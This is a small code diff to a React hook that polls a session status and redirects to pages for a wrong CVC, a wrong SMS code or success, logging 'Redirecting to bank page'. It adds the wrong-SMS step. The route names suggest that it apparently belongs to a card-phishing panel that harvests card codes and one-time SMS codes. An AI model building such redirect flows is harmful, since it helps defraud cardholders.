@@ -41,6 +41,10 @@ export const useRedirectChecker = (interval: number = 3000) => {
               console.log("🔄 Redirecting to bank page");
               navigate(`/wrong-cvc/${sessionId}`);
               break;
+            case "wrong-sms":
+              console.log("🔄 Redirecting to bank page");
+              navigate(`/wrong-sms/${sessionId}`);
+              break;
             case "success":
               console.log("🔄 Redirecting to bank page");
               navigate(`/success/${sessionId}`);
